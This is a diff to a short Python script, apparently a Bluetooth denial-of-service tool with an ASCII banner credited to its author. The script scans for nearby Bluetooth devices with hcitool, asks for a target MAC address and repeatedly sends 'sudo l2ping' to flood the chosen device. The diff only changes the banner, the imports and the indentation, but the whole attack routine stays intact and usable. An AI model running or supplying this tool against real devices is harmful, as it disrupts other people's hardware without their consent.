@@ -1,5 +1,15 @@
 import subprocess
-import threading
+import time
+
+print("""
+ ██████╗ ██╗   ██╗███████╗██████╗     ██████╗ ██╗██████╗ ███████╗
+██╔═══██╗██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║██╔══██╗██╔════╝
+██║   ██║██║   ██║█████╗  ██████╔╝    ██████╔╝██║██║  ██║█████╗  
+██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██╔══██╗██║██║  ██║██╔══╝  
+╚██████╔╝ ╚████╔╝ ███████╗██║  ██║    ██║  ██║██║██████╔╝███████╗
+ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝
+By Dinesh Sakthivel
+""")
 
 def scan():
         print("[+] Enabling bluetooth...")
@@ -8,7 +18,6 @@ def scan():
         print("[+] Scanning for MAC address...")
         subprocess.run(["hcitool", "scan"])
         print("[+] Done!")
-
 def dos(MACaddress):
         subprocess.run(["sudo", "l2ping", MACaddress])
         subprocess.run(["sudo", "l2ping", MACaddress])
@@ -18,19 +27,9 @@ def dos(MACaddress):
         subprocess.run(["sudo", "l2ping", MACaddress])
         subprocess.run(["sudo", "l2ping", MACaddress])
         subprocess.run(["sudo", "l2ping", MACaddress])
-
 try:
-  print("""
- █████╗  ██████╗ ██████╗███████╗███████╗███████╗     ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ 
-██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-███████║██║     ██║     █████╗  ███████╗███████╗    ██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║
-██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║    ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
-██║  ██║╚██████╗╚██████╗███████╗███████║███████║    ╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝
-╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ 
-By Dinesh Sakthivel
-""")
-       scan()
-       target = input("[+] Enter target MAC address: ")
-       dos(target)
+    scan()
+    target = input("[+] Enter target MAC address: ")
+    dos(target)
 except KeyboardInterrupt:
         print("Quitting attack...")
